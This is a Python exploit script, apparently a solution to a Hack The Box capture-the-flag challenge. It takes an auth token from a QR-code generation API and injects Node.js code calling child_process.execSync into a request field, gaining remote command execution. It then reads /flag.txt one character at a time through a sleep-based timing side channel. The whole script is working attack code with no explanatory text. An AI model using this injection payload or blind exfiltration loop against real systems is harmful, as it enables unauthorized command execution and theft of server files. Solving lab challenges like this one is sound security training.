import requests
import json
import string
letters_uppercase = string.ascii_uppercase   # 'A' to 'Z'
letters_lowercase = string.ascii_lowercase   # 'a' to 'z'
numbers = string.digits                      # '0' to '9'
special_characters = "!@#$%^&*()-_=+[]{};:',.<>/?\\|`~"
character_pool = letters_uppercase + letters_lowercase + numbers + special_characters

server="83.136.254.158"
port=35299
url=f"http://{server}:{port}"
auth_endpoint=f"{url}/api/auth/authenticate"
qr_endpoint=f"{url}/api/service/generate"

def get_auth(auth_endpoint):
    headers = {"Content-Type": "application/json"}
    data = {"email": "test@hackthebox.com"}
    response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
    token = response.json()['token']
    return token



def get_qr_response(token, user_input):
    token = get_auth(auth_endpoint)
    user_input = user_input.replace("'", '"')
    payload={ "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"}
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
    response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
    output = response.json()
    time = response.elapsed.total_seconds()
    return time,output

token = get_auth(auth_endpoint)
htbresponse = []
number = 1
while True:
    print(number)
    pastlen = len(htbresponse)
    for letter in character_pool:
        print(letter)
        time , output = get_qr_response(token, user_input="cat /flag.txt | head -c {number} | tail -c 1 |  {{ read c; if [ \"$c\" = \"{letter}\" ]; then sleep 5; fi; }}".format(letter=letter, number=number))
        if time >= 5:
            print("Found the letter: " + letter)
            htbresponse.append(letter)
            newlen = len(htbresponse)
            break

    print(''.join(htbresponse))
    if newlen == pastlen:
        break
    else:
        pastlen = newlen
    number += 1

